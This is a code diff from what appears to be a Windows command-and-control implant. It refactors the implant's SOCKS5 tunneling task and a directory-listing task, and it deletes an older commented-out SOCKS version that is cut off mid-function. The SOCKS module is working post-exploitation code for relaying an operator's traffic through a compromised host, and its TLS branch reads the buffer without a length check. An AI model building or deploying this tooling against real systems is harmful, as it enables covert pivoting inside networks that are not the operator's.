@@ -511,12 +511,17 @@ auto DECLFN Task::FileSystem(
             SYSTEMTIME       AccessTime   = { 0 };
             SYSTEMTIME       WriteTime    = { 0 };
 
-            HANDLE FileHandle = NULL;
+            CHAR   FullPath[MAX_PATH];
+            HANDLE FileHandle = nullptr;
             ULONG  FileSize   = 0;
             PCHAR  TargetDir  = Self->Psr->Str( Parser, &TmpVal );
             HANDLE FindHandle = Self->Krnl32.FindFirstFileA( TargetDir, &FindData );
 
             if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;
+
+            Self->Krnl32.GetFullPathNameA( FindData.cFileName, MAX_PATH, FullPath, nullptr );
+
+            Self->Pkg->Str( Package, FullPath );
         
             do {
                 FileHandle = Self->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
@@ -525,9 +530,7 @@ auto DECLFN Task::FileSystem(
                 Self->Ntdll.NtClose( FileHandle );
 
                 Self->Pkg->Str( Package, FindData.cFileName );
-
                 Self->Pkg->Int32( Package, FileSize );
-
                 Self->Pkg->Int32( Package, FindData.dwFileAttributes );
         
                 Self->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );
@@ -669,616 +672,306 @@ auto DECLFN Task::Pivot(
 }
 
 unsigned int DECLFN base64_decode(const char* input, unsigned char* output, unsigned int output_size);
-
 auto DECLFN Task::Socks(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    KhDbg("Starting SOCKS task processing");
-    
-    PACKAGE* Package = Job->Pkg;
-    PARSER*  Parser  = Job->Psr;
+    KhDbg("SOCKS task started");
 
-    BOOL  IsExit    = Self->Psr->Int32(Parser);
-    ULONG ServerID  = Self->Psr->Int32(Parser);
+    PACKAGE* Pkg = Job->Pkg;
+    PARSER*  Psr = Job->Psr;
 
-    ULONG B64DataLen   = 0;
-    BYTE* B64Data = { 0 };
-    ULONG DataLen = 0;
-    BYTE* Data = { 0 };
+    BOOL IsExit = Self->Psr->Int32(Psr);
+    ULONG ServerID = Self->Psr->Int32(Psr);
+
+    ULONG b64Len = 0;
+    BYTE* b64Data = nullptr;
+    ULONG dataLen = 0;
+    BYTE* data = nullptr;
 
     if (!IsExit) {
-        B64Data = Self->Psr->Bytes(Parser, &B64DataLen);
-    
-        DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data);
-        Data = (BYTE*)hAlloc(DataLen);
-        if (!Data) {
-            KhDbg("Failed to allocate memory for decoded data");
-            return ERROR_OUTOFMEMORY;
+        b64Data = Self->Psr->Bytes(Psr, &b64Len);
+        if (b64Data && b64Len) {
+            dataLen = Self->Pkg->Base64DecSize((PCHAR)b64Data);
+            data = (BYTE*)hAlloc(dataLen);
+            if (!data) {
+                KhDbg("malloc fail");
+                return ERROR_OUTOFMEMORY;
+            }
+            base64_decode((PCHAR)b64Data, (PUCHAR)data, dataLen);
         }
-        base64_decode((PCHAR)B64Data, (PUCHAR)Data, DataLen);
-
     }
 
-    KhDbg(
-        "ServerID: %u, IsExit: %d", 
-        ServerID, IsExit
-    );
-        
-    BYTE* ResponseData = nullptr;
-    ULONG ResponseLen  = 0;
-    ERROR_CODE Result  = ERROR_SUCCESS;
+    KhDbg("ServerID: %u, IsExit: %d", ServerID, IsExit);
 
-    ULONG Operation;
+    BYTE* respData = nullptr;
+    ULONG respLen = 0;
+    ERROR_CODE Result = ERROR_SUCCESS;
+
+    ULONG operation;
     if (IsExit) {
-        Operation = KH_SOCKET_CLOSE;
-        KhDbg("Operation: CLOSE connection");
-    } else if (Self->Skt->Exist(ServerID)) {
-        Operation = KH_SOCKET_DATA;
-        KhDbg("Operation: DATA for existing connection");
-    } else {
-        Operation = KH_SOCKET_NEW;
-        KhDbg("Operation: NEW connection");
+        operation = KH_SOCKET_CLOSE;
+        KhDbg("Operation: close socket");
+    }
+    else if (Self->Skt->Exist(ServerID)) {
+        operation = KH_SOCKET_DATA;
+        KhDbg("Operation: data for existing socket");
+    }
+    else {
+        operation = KH_SOCKET_NEW;
+        KhDbg("Operation: new socket");
     }
 
-    Self->Skt->LogData("received", Data, DataLen);
+    if (data && dataLen)
+        Self->Skt->LogData("received", data, dataLen);
 
-    switch ( Operation ) {
-        case KH_SOCKET_NEW: {
-            KhDbg("Starting new SOCKS5 connection");
+    switch (operation) {
+    case KH_SOCKET_NEW: {
+        SOCKET newSock = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (newSock == INVALID_SOCKET) {
+            DWORD err = KhGetError;
+            KhDbg("socket() fail: 0x%X", err);
+            Result = err;
+            break;
+        }
+        KhDbg("socket created: %llu", (ULONG64)newSock);
 
-            SOCKET newSocket = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-            if (newSocket == INVALID_SOCKET) {
-                DWORD err = KhGetError;
-                KhDbg("Failed to create socket: 0x%X", err);
-                return err;
+        BOOL isTLS = (dataLen > 0 && data[0] == 0x16);
+        ULONG targetIP = 0;
+        USHORT targetPort = 0;
+        ULONG hdrSize = 0;
+
+        if (!isTLS) {
+            if (dataLen < 10) {
+                KhDbg("invalid SOCKS5 header size");
+                Self->Ws2_32.closesocket(newSock);
+                Result = ERROR_INVALID_DATA;
+                break;
             }
-            KhDbg("Socket created: %llu", (ULONG64)newSocket);
 
-            BOOL IsTLS = (DataLen > 0 && Data[0] == 0x16); // TLS Handshake record
-            if (IsTLS) {
-                KhDbg("Detected TLS/HTTPS connection - enabling passthrough mode");
+            if (data[0] != 0x05) {
+                KhDbg("invalid SOCKS version 0x%02X", data[0]);
+                Self->Ws2_32.closesocket(newSock);
+                Result = ERROR_INVALID_DATA;
+                break;
             }
 
-            ULONG targetIP = 0;
-            USHORT targetPort = 0;
-            ULONG headerSize = 0;
-
-            if ( !IsTLS ) {
-                if ( DataLen < 10 ) {
-                    KhDbg("Insufficient data for SOCKS5 header");
-                    Self->Ws2_32.closesocket( newSocket );
-                    return ERROR_INVALID_DATA;
+            switch (data[3]) {
+            case 0x01: { // IPv4
+                if (dataLen < 10) {
+                    KhDbg("incomplete IPv4 data");
+                    Self->Ws2_32.closesocket(newSock);
+                    Result = ERROR_INVALID_DATA;
+                    break;
                 }
-
-                if ( Data[0] != 0x05 ) {
-                    KhDbg( "Invalid SOCKS version: 0x%02X", Data[0] );
-                    Self->Ws2_32.closesocket( newSocket );
-                    return ERROR_INVALID_DATA;
+                Mem::Copy(&targetIP, data + 4, sizeof(ULONG));
+                Mem::Copy(&targetPort, data + 8, sizeof(USHORT));
+                hdrSize = 10;
+                KhDbg("connecting to IPv4 %d.%d.%d.%d:%d", data[4], data[5], data[6], data[7], Self->Ws2_32.ntohs(targetPort));
+                break;
+            }
+            case 0x03: { // Domain
+                if (dataLen < 5) {
+                    KhDbg("incomplete domain data");
+                    Self->Ws2_32.closesocket(newSock);
+                    Result = ERROR_INVALID_DATA;
+                    break;
                 }
+                UCHAR domLen = data[4];
+                hdrSize = 5 + domLen + 2;
+                if (dataLen < hdrSize) {
+                    KhDbg("domain data incomplete size %u expected %u", dataLen, hdrSize);
+                    Self->Ws2_32.closesocket(newSock);
+                    Result = ERROR_INVALID_DATA;
+                    break;
+                }
+                CHAR domain[MAX_PATH] = { 0 };
+                Mem::Copy(domain, data + 5, domLen);
+                addrinfo hints = { 0 };
+                hints.ai_family = AF_INET;
+                hints.ai_socktype = SOCK_STREAM;
+                addrinfo* res = nullptr;
+                if (Self->Ws2_32.getaddrinfo(domain, nullptr, &hints, &res) != 0) {
+                    KhDbg("getaddrinfo fail for %s", domain);
+                    Self->Ws2_32.closesocket(newSock);
+                    Result = ERROR_NOT_FOUND;
+                    break;
+                }
+                targetIP = ((sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
+                Mem::Copy(&targetPort, data + 5 + domLen, sizeof(USHORT));
+                Self->Ws2_32.freeaddrinfo(res);
+                KhDbg("connecting to domain %s:%d", domain, Self->Ws2_32.ntohs(targetPort));
+                break;
+            }
+            default:
+                KhDbg("unsupported address type 0x%02X", data[3]);
+                Self->Ws2_32.closesocket(newSock);
+                Result = ERROR_NOT_SUPPORTED;
+                break;
+            }
 
-                switch ( Data[3] ) {  // Address type
-                    case 0x01: { // IPv4
-                        if ( DataLen < 10 ) {
-                            KhDbg("Incomplete IPv4 data");
-                            Self->Ws2_32.closesocket(newSocket);
-                            return ERROR_INVALID_DATA;
-                        }
-                        targetIP   = *(ULONG* )(Data + 4);
-                        targetPort = *(USHORT*)(Data + 8);
-                        headerSize = 10;
-                        
-                        KhDbg("Connecting to IPv4: %d.%d.%d.%d:%d",
-                              Data[4], Data[5], Data[6], Data[7], 
-                              Self->Ws2_32.ntohs( targetPort )
-                        );
+            if (Result != ERROR_SUCCESS)
+                break;
+        }
+        else {
+            Mem::Copy(&targetIP, data + 4, sizeof(ULONG));
+            Mem::Copy(&targetPort, data + 8, sizeof(USHORT));
+            hdrSize = 0;
+        }
+
+        sockaddr_in dstAddr = { 0 };
+        dstAddr.sin_family = AF_INET;
+        dstAddr.sin_addr.s_addr = targetIP;
+        dstAddr.sin_port = targetPort;
+
+        BOOL noDelay = TRUE;
+        Self->Ws2_32.setsockopt(newSock, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay));
+
+        KhDbg("connecting socket to target");
+        if (Self->Ws2_32.connect(newSock, (sockaddr*)&dstAddr, sizeof(dstAddr)) == SOCKET_ERROR) {
+            DWORD err = KhGetError;
+            KhDbg("connect fail: 0x%X", err);
+            Self->Ws2_32.closesocket(newSock);
+            Result = err;
+            break;
+        }
+
+        KhDbg("connected successfully");
+
+        if (!isTLS) {
+            BYTE socksResp[10] = { 0x05,0x00,0x00,0x01,0,0,0,0,0,0 };
+            respData = (BYTE*)hAlloc(sizeof(socksResp));
+            if (!respData) {
+                KhDbg("malloc fail for response");
+                Self->Ws2_32.closesocket(newSock);
+                Result = ERROR_OUTOFMEMORY;
+                break;
+            }
+            Mem::Copy(respData, socksResp, sizeof(socksResp));
+            respLen = sizeof(socksResp);
+        }
+
+        ERROR_CODE err = Self->Skt->Add(ServerID, newSock);
+        if (err != ERROR_SUCCESS) {
+            KhDbg("Skt->Add fail 0x%X", err);
+            if (respData) hFree(respData);
+            Self->Ws2_32.closesocket(newSock);
+            Result = err;
+            break;
+        }
+
+        if (dataLen > (isTLS ? 0 : hdrSize)) {
+            ULONG offset = isTLS ? 0 : hdrSize;
+            ULONG sendSz = dataLen - offset;
+            if (sendSz) {
+                KhDbg("sending initial %u bytes", sendSz);
+                int sent = Self->Ws2_32.send(newSock, (char*)(data + offset), sendSz, 0);
+                if (sent == SOCKET_ERROR) {
+                    DWORD serr = KhGetError;
+                    KhDbg("send error 0x%X (continue)", serr);
+                    Result = serr;
+                }
+                else {
+                    KhDbg("sent %d bytes", sent);
+                }
+            }
+        }
+        break;
+    }
+    case KH_SOCKET_DATA: {
+        KhDbg("SOCKET_DATA processing for ServerID %u", ServerID);
+
+        SOCKET ActiveSock = Self->Skt->Get(ServerID);
+        if (ActiveSock == INVALID_SOCKET) {
+            KhDbg("Socket not found for ServerID %u", ServerID);
+            Result = ERROR_NOT_FOUND;
+            break;
+        }
+
+        if (dataLen > 0) {
+            Self->Skt->LogData("sending to target", data, dataLen);
+
+            INT32 BytesSent = Self->Ws2_32.send(ActiveSock, (CHAR*)data, dataLen, 0);
+            if (BytesSent == SOCKET_ERROR) {
+                KhDbg("send failed with error: %d", Self->Ws2_32.WSAGetLastError());
+                break;
+            }
+
+            ULONG BuffRecvLen = max(0x1000, dataLen * 2);
+            BYTE* BuffRecv = (BYTE*)hAlloc(BuffRecvLen);
+            if (!BuffRecv) {
+                KhDbg("malloc fail for buffer");
+                break;
+            }
+
+            ULONG TotalRead = 0;
+
+            while (true) {
+                ULONG DataAvail = 0;
+                if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &DataAvail) != 0 || DataAvail == 0)
+                    break;
+
+                if ((TotalRead + DataAvail) > BuffRecvLen) {
+                    ULONG NewLen = BuffRecvLen * 2;
+                    BYTE* NewBuff = (BYTE*)hReAlloc(BuffRecv, NewLen);
+                    if (!NewBuff) {
+                        KhDbg("realloc fail");
                         break;
                     }
-                    
-                    case 0x03: { // Domain name
-                        if (DataLen < 5) {
-                            KhDbg("Incomplete domain data");
-                            Self->Ws2_32.closesocket(newSocket);
-                            return ERROR_INVALID_DATA;
-                        }
-                        UCHAR domainLen = Data[4];
-                        headerSize = 5 + domainLen + 2;
-                        
-                        if (DataLen < headerSize) {
-                            KhDbg("Incomplete domain data (size: %d, expected: %d)",
-                                  DataLen, headerSize);
-                            Self->Ws2_32.closesocket(newSocket);
-                            return ERROR_INVALID_DATA;
-                        }
-                        
-                        CHAR domain[MAX_PATH] = { 0 };
-
-                        Mem::Copy(domain, Data + 5, domainLen);
-                        
-                        addrinfo hints    = { 0 };
-                        hints.ai_family   = AF_INET;
-                        hints.ai_socktype = SOCK_STREAM;
-                        addrinfo* result  = nullptr;
-                        
-                        if ( Self->Ws2_32.getaddrinfo( domain, nullptr, &hints, &result ) != 0 ) {
-                            KhDbg("Failed to resolve domain: %s", domain);
-                            Self->Ws2_32.closesocket( newSocket );
-                            return ERROR_NOT_FOUND;
-                        }
-                        
-                        targetIP = ((sockaddr_in*)result->ai_addr)->sin_addr.s_addr;
-                        targetPort = *(USHORT*)(Data + 5 + domainLen);
-                        Self->Ws2_32.freeaddrinfo(result);
-                        
-                        KhDbg("Connecting to domain: %s:%d", domain, Self->Ws2_32.ntohs(targetPort));
-                        break;
-                    }
-                    
-                    default: {
-                        KhDbg("Unsupported address type: 0x%02X", Data[3]);
-                        Self->Ws2_32.closesocket(newSocket);
-                        return ERROR_NOT_SUPPORTED;
-                    }
-                }
-            } else {
-                targetIP   = *(ULONG* )(Data + 4); // Adjust based on your protocol
-                targetPort = *(USHORT*)(Data + 8); // Adjust based on your protocol
-                headerSize = 0; // No SOCKS header for TLS
-            }
-
-            sockaddr_in targetAddr = { 0 };
-            targetAddr.sin_family  = AF_INET;
-            targetAddr.sin_addr.s_addr = targetIP;
-            targetAddr.sin_port    = targetPort;
-
-            BOOL noDelay = TRUE;
-            Self->Ws2_32.setsockopt( newSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay) );
-
-            KhDbg("Connecting to destination...");
-            
-            if ( Self->Ws2_32.connect( newSocket, (sockaddr*)&targetAddr, sizeof( targetAddr ) ) == SOCKET_ERROR ) {
-                DWORD err = KhGetError;
-                KhDbg("Connection failed: 0x%X", err);
-                Self->Ws2_32.closesocket(newSocket);
-                return err;
-            }
-
-            KhDbg("Connection established successfully");
-
-            if ( !IsTLS ) {
-                BYTE socksResponse[10] = { 
-                    0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-                };
-                
-                ResponseData = (BYTE*)hAlloc( sizeof(socksResponse) );
-                if ( !ResponseData ) {
-                    KhDbg("Failed to allocate memory for response");
-                    Self->Ws2_32.closesocket( newSocket );
-                    return ERROR_OUTOFMEMORY;
+                    BuffRecv = NewBuff;
+                    BuffRecvLen = NewLen;
                 }
 
-                Mem::Copy(ResponseData, socksResponse, sizeof(socksResponse));
-                ResponseLen = sizeof(socksResponse);
+                ULONG DataRead = 0;
+                if (!Self->Skt->RecvAll(ActiveSock, BuffRecv + TotalRead, min(DataAvail, BuffRecvLen - TotalRead), &DataRead)) {
+                    KhDbg("RecvAll failed: %d", Self->Ws2_32.WSAGetLastError());
+                    break;
+                }
 
-                KhDbg("SOCKS response (%d bytes):", ResponseLen);
+                TotalRead += DataRead;
             }
 
-            ERROR_CODE err = Self->Skt->Add(ServerID, newSocket);
-            if (err != ERROR_SUCCESS) {
-                KhDbg("Failed to store socket: 0x%X", err);
-                if (ResponseData) hFree(ResponseData);
-                Self->Ws2_32.closesocket(newSocket);
-                return err;
-            }
-
-            if ( DataLen > (IsTLS ? 0 : headerSize) ) {
-                ULONG sendOffset = IsTLS ? 0 : headerSize;
-                ULONG sendSize = DataLen - sendOffset;
-                KhDbg("Sending %d bytes of initial data", sendSize);
-                
-                KhDbg("Data being sent (%d bytes):", sendSize);
-                
-                int bytesSent = Self->Ws2_32.send(
-                    newSocket, (char*)(Data + sendOffset), sendSize, 0
-                );
-                
-                if (bytesSent == SOCKET_ERROR) {
-                    DWORD sendErr = KhGetError;
-                    KhDbg("Error sending initial data: 0x%X (continuing)", sendErr);
-                    Result = sendErr;
-                } else {
-                    KhDbg("Successfully sent %d bytes", bytesSent);
+            if (TotalRead > 0) {
+                respData = (BYTE*)hAlloc(TotalRead);
+                if (respData) {
+                    Mem::Copy(respData, BuffRecv, TotalRead);
+                    respLen = TotalRead;
                 }
             }
-            break;
+            hFree(BuffRecv);
         }
-
-        case KH_SOCKET_DATA: {
-            KhDbg("Processing data for existing connection");
-
-            SOCKET ActiveSock = Self->Skt->Get( ServerID );
-            if ( ActiveSock == INVALID_SOCKET ) {
-                KhDbg("Connection not found for ServerID: %u", ServerID);
-                return ERROR_NOT_FOUND;
-            }
-
-            KhDbg("Input data to forward (%d bytes):", DataLen);
-
-            if ( DataLen > 0 ) {
-                Self->Skt->LogData( "Sending to target", Data, DataLen );
-
-                INT32 DataSent = Self->Ws2_32.send( ActiveSock, (CHAR*)Data, DataLen, 0 );
-                if ( DataSent == SOCKET_ERROR )  {
-                    KhDbg( "err: %d", Self->Ws2_32.WSAGetLastError() ); break;
-                }
-
-                KhDbg( "Data sent" );
-
-                ULONG BuffRecvL = max( 0x1000, DataLen * 2 );
-                BYTE* BuffRecv  = (BYTE*)hAlloc( BuffRecvL );
-
-                KhDbg( "Allocating buffer to receive data: %d", BuffRecvL );
-
-                if ( BuffRecvL ) {
-                    ULONG TotalRead = 0;
-                    ULONG StartTime = Self->Krnl32.GetTickCount();
-
-                    while ( ( Self->Krnl32.GetTickCount() - StartTime ) < 500 ) {
-                        ULONG DataAvail = 0;
-                        INT32 IoCtlRes  = Self->Ws2_32.ioctlsocket( ActiveSock, FIONREAD, &DataAvail );
-
-                        KhDbg( "Io CTL Result=%d Avail=%lu", IoCtlRes, DataAvail );
-
-                        if ( IoCtlRes == 0 && DataAvail > 0 ) {
-                            if ( ( TotalRead + DataAvail ) > BuffRecvL ) {
-                                ULONG NewLen  = BuffRecvL * 2;
-                                BYTE* NewBuff = (BYTE*)hReAlloc( BuffRecv, NewLen );
-
-                                BuffRecv  = NewBuff;
-                                BuffRecvL = NewLen;
-                            }
-
-                            ULONG DataRead = 0;
-
-                            if ( 
-                                Self->Skt->RecvAll( 
-                                    ActiveSock, ( BuffRecv + TotalRead ), min( DataAvail, ( BuffRecvL - TotalRead ) ), &DataRead 
-                                )
-                            ) {
-                                TotalRead += DataRead;
-                                KhDbg( "Read %d bytes (Total %d)", DataRead, TotalRead );
-                            } else {
-                                KhDbg( "Recv failed: %d", Self->Ws2_32.WSAGetLastError() ); break;
-                            }
-                        } else if ( IoCtlRes != 0 ) {
-                            KhDbg( "Io Ctl err: %d", Self->Ws2_32.WSAGetLastError() );
-                        }
-
-                        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 10 );
-                    }
-
-                    if ( TotalRead > 0 ) {
-                        Self->Skt->LogData( "Sending to Srv", BuffRecv, BuffRecvL );
-                        ResponseData = BuffRecv;
-                        ResponseLen  = BuffRecvL;
-                    } else {
-                        KhDbg( "no data received within timout" );
-                    }
-
-                    hFree( BuffRecv );
-                }
-            } else {
-                KhDbg( "no data to send" );
-            }
-
-            break;
+        break;
+    }
+    case KH_SOCKET_CLOSE: {
+        SOCKET sock = Self->Skt->Get(ServerID);
+        if (sock != INVALID_SOCKET) {
+            Self->Ws2_32.closesocket(sock);
+            Self->Skt->RmCtx(ServerID);
+            KhDbg("socket closed for ServerID %u", ServerID);
         }
-
-        case KH_SOCKET_CLOSE: {
-            KhDbg("Closing SOCKS connection");
-
-            SOCKET sockToClose = Self->Skt->Get(ServerID);
-            if (sockToClose != INVALID_SOCKET) {
-                KhDbg("Closing socket: %llu", (ULONG64)sockToClose);
-                Self->Ws2_32.closesocket(sockToClose);
-                Self->Skt->RmCtx(ServerID);
-            } else {
-                KhDbg("Socket not found for closing");
-            }
-            break;
-        }
-
-        default: {
-            KhDbg("Unknown operation: %u", Operation);
-            return ERROR_INVALID_PARAMETER;
-        }
+        break;
+    }
+    default:
+        KhDbg("unknown operation");
+        Result = ERROR_INVALID_PARAMETER;
+        break;
     }
 
-    // Package response
-    KhDbg("Preparing response - IsExit: %d, ServerID: %u, ResponseLen: %u",
-          IsExit, ServerID, ResponseLen);
-    
-    Self->Pkg->Int32( Package, IsExit );
-    Self->Pkg->Int32( Package, ServerID);
+    Self->Pkg->Int32(Pkg, IsExit);
+    Self->Pkg->Int32(Pkg, ServerID);
 
-    if ( ResponseData ) {
-        Self->Skt->LogData("sending", ResponseData, ResponseLen);
-
-        PCHAR FinalPkt = Self->Pkg->Base64Enc(ResponseData, ResponseLen);
-        ULONG FinalLen = Self->Pkg->Base64EncSize(ResponseLen);
-        Self->Pkg->Bytes(Package, (PUCHAR)FinalPkt, FinalLen);
-        hFree(ResponseData);
+    if (respData && respLen) {
+        Self->Skt->LogData("sending", respData, respLen);
+        PCHAR finalPkt = Self->Pkg->Base64Enc(respData, respLen);
+        ULONG finalLen = Self->Pkg->Base64EncSize(respLen);
+        Self->Pkg->Bytes(Pkg, (PUCHAR)finalPkt, finalLen);
+        hFree(respData);
     }
 
-    if ( Data ) {
-        hFree(Data);
-    }
+    if (data) hFree(data);
 
-    KhDbg("SOCKS task completed with status: 0x%X", Result);
+    KhDbg("SOCKS task finished with status 0x%X", Result);
     return Result;
 }
-
-// auto DECLFN Task::Socks(_In_ JOBS* Job) -> ERROR_CODE {
-//     KhDbg("SOCKS5: Starting processing (Job: %p)", Job);
-
-//     Self->Sckt->InitWSA();
-
-//     PACKAGE* Package = Job->Pkg;
-//     PARSER*  Parser  = Job->Psr;
-
-//     BOOL  IsExit    = Self->Psr->Int32( Parser );
-//     ULONG ServerID  = Self->Psr->Int32( Parser );
-
-//     KhDbg("SOCKS5: Parameters - IsExit=%d, ServerID=%u", IsExit, ServerID);
-
-//     BYTE* Data = nullptr;
-//     ULONG DataLen = 0;
-//     BYTE* B64Data = nullptr;
-//     ULONG B64DataLen = 0;
-    
-//     if ( !IsExit ) {
-        
-//         B64Data = Self->Psr->Bytes( Parser, &B64DataLen );
-//         DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data );
-//         Data = (BYTE*)hAlloc( DataLen );
-//         if (!Data) {
-//             KhDbg("SOCKS5: ERROR: Allocation failed (Size=%u)", DataLen);
-//             return ERROR_OUTOFMEMORY;
-//         }
-//         base64_decode((PCHAR)B64Data, (PUCHAR)Data, DataLen);
-//         KhDbg("SOCKS5: Decoded data (Size=%u)", DataLen);
-//     }
-
-//     Self->Sckt->LogData("received data", Data, DataLen);
-
-//     BYTE Socks5FastResponse[10] = {0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-//     BYTE* ResponseData = nullptr;
-//     u_long  IoBool = 1;
-//     ULONG ResponseLen = 0;
-//     addrinfo  Hints = { 0 };
-//     addrinfo* Rest  = { 0 };
-//     sockaddr_in targetAddr = { 0 };
-//     BYTE  AddrType  = 0;
-//     ERROR_CODE Result = ERROR_SUCCESS;
-//     ULONG Operation = 0;
-//     ULONG targetIP = 0;
-//     USHORT targetPort = 0;
-
-//     if ( IsExit ) {
-//         Operation = KH_SOCKET_CLOSE;
-//         KhDbg("SOCKS5: Operation CLOSE (ServerID=%u)", ServerID);
-//     } else if ( Self->Sckt->Exist( ServerID ) ) {
-//         Operation = KH_SOCKET_DATA;
-//         KhDbg("SOCKS5: Operation DATA (ServerID=%u)", ServerID);
-//     } else {
-//         Operation = KH_SOCKET_NEW;
-//         KhDbg("SOCKS5: Operation NEW (ServerID=%u)", ServerID);
-//     }
-
-//     switch (Operation) {
-//         case KH_SOCKET_NEW: {
-//             KhDbg("SOCKS5: Creating new socket");
-//             SOCKET newSocket = Self->Ws2_32.WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
-//             if (newSocket == INVALID_SOCKET) {
-//                 KhDbg("SOCKS5: ERROR: Socket creation failed (Code=0x%X)", KhGetError);
-//                 return KhGetError;
-//             }
-
-//             AddrType = Data[3];
-//             targetAddr.sin_family = AF_INET;
-
-//             KhDbg("type: %X", AddrType);
-            
-//             if (AddrType == 0x01) { // IPv4 
-//                 targetIP = *(ULONG*)(Data + 4);
-//                 targetPort = *(USHORT*)(Data + 8);
-
-//                 targetAddr.sin_port = targetPort;
-//                 targetAddr.sin_addr.s_addr = targetIP;
-//             } 
-//             else if (AddrType == 0x03) { // Domain
-//                 BYTE DomainLen = Data[4];
-//                 CHAR DomainName[MAX_PATH] = {0}; 
-
-//                 Mem::Copy(DomainName, (Data + 5), DomainLen);
-//                 DomainName[DomainLen] = '\0';
-
-//                 Hints.ai_family = AF_INET;
-//                 Hints.ai_socktype = SOCK_STREAM;
-
-//                 int res = Self->Ws2_32.getaddrinfo(DomainName, nullptr, &Hints, &Rest);
-//                 if (res != 0) {
-//                     KhDbg("SOCKS5: ERROR: Domain resolution failed (Code=0x%X)", res);
-//                     Self->Ws2_32.closesocket(newSocket);
-//                     return res; 
-//                 }
-
-//                 targetAddr.sin_addr.s_addr = ((sockaddr_in*)Rest->ai_addr)->sin_addr.s_addr;
-//                 targetPort = *(USHORT*)(Data + 5 + DomainLen); 
-//                 targetAddr.sin_port = targetPort;
-
-//                 Self->Ws2_32.freeaddrinfo(Rest);
-//             }
-            
-//             KhDbg("Target: %s:%d", Self->Ws2_32.inet_ntoa(targetAddr.sin_addr), targetPort);
-
-//             BOOL noDelay = TRUE;
-//             Self->Ws2_32.setsockopt(newSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay));
-//             KhDbg("SOCKS5: Socket configured (NoDelay=1)");
-
-//             if (Self->Ws2_32.connect(newSocket, (sockaddr*)&targetAddr, sizeof(targetAddr))) {
-//                 KhDbg("SOCKS5: ERROR: Connection failed (Code=0x%X)", KhGetError);
-//                 Self->Ws2_32.closesocket(newSocket);
-//                 return KhGetError;
-//             }
-
-//             if (Self->Ws2_32.ioctlsocket(newSocket, FIONBIO, &IoBool)) {
-//                 KhDbg("failed non blocking");
-//             }
-
-//             KhDbg("SOCKS5: Connection established");
-
-//             ResponseData = (BYTE*)hAlloc(10);
-//             if (!ResponseData) {
-//                 KhDbg("SOCKS5: ERROR: Failed to allocate response buffer");
-//                 Self->Ws2_32.closesocket(newSocket);
-//                 return ERROR_OUTOFMEMORY;
-//             }
-//             Mem::Copy(ResponseData, Socks5FastResponse, 10);
-//             ResponseLen = 10;
-//             Self->Sckt->Add(ServerID, newSocket);
-//             KhDbg("SOCKS5: Socket added to manager (ID=%u)", ServerID);
-//             break;
-//         }
-
-//         case KH_SOCKET_DATA: {
-//             KhDbg("SOCKS5: Processing data (Size=%u)", DataLen);
-//             SOCKET ActiveSock = Self->Sckt->Get( ServerID );
-//             if (ActiveSock == INVALID_SOCKET) {
-//                 KhDbg("SOCKS5: ERROR: Socket not found (ID=%u)", ServerID);
-//                 return ERROR_NOT_FOUND;
-//             }
-
-//             ULONG totalSent = 0;
-//             while ( totalSent < DataLen ) {
-//                 int sent = Self->Ws2_32.send( ActiveSock, (char*)(Data + totalSent), DataLen - totalSent, 0 );
-//                 if (sent == SOCKET_ERROR) {
-//                     KhDbg("SOCKS5: ERROR: Send failed (Code=0x%X)", KhGetError);
-//                     return KhGetError;
-//                 }
-//                 totalSent += sent;
-//                 KhDbg("SOCKS5: Sent %u/%u bytes", totalSent, DataLen);
-//             }
-
-//             ULONG TmpLen = 0;
-//             BYTE* NewBuff = nullptr;
-//             BYTE* TmpBuff = nullptr;
-
-//             do {
-//                 if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &TmpLen) == SOCKET_ERROR) {
-//                     KhDbg("SOCKS5: ERROR: ioctlsocket failed (Code=0x%X)", KhGetError);
-//                     break;
-//                 }
-
-//                 KhDbg("SOCKS5: FIONREAD returned %u bytes available", TmpLen);
-
-//                 if ( ! TmpLen ) {
-
-//                     KhDbg("trying again with select timeout", TmpLen);
-
-//                     fd_set readSet;
-//                     FD_ZERO(&readSet);
-//                     FD_SET(ActiveSock, &readSet);
-
-//                     struct timeval timeout = {6, 0}; 
-
-//                     int ready = Self->Ws2_32.select(0, &readSet, NULL, NULL, &timeout);
-//                     if (ready <= 0) {
-//                         KhDbg("SOCKS5: no data available (timeout/error)");
-//                     }
-
-//                     if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &TmpLen) == SOCKET_ERROR) {
-//                         KhDbg("SOCKS5: ERROR: ioctlsocket failed (Code=0x%X)", KhGetError);
-//                         break;
-//                     }
-
-//                     KhDbg("SOCKS5: FIONREAD returned %u bytes available", TmpLen);
-//                 }
-
-//                 if (TmpLen > 0) {
-//                     TmpBuff = (BYTE*)hAlloc( TmpLen );
-//                     if (!TmpBuff) {
-//                         KhDbg("SOCKS5: ERROR: Failed to allocate buffer for %u bytes", TmpLen);
-//                         break;
-//                     }
-
-//                     if (!Self->Sckt->RecvAll(ActiveSock, TmpBuff, TmpLen, &TmpLen)) {
-//                         KhDbg("SOCKS5: ERROR: RecvAll failed (Code=0x%X)", KhGetError);
-//                         hFree(TmpBuff);
-//                         break;
-//                     }
-
-//                     KhDbg("SOCKS5: Received %u bytes", TmpLen);
-
-//                     if (TmpLen > 0) {
-//                         if (!ResponseData) {
-//                             ResponseData = TmpBuff;
-//                             ResponseLen = TmpLen;
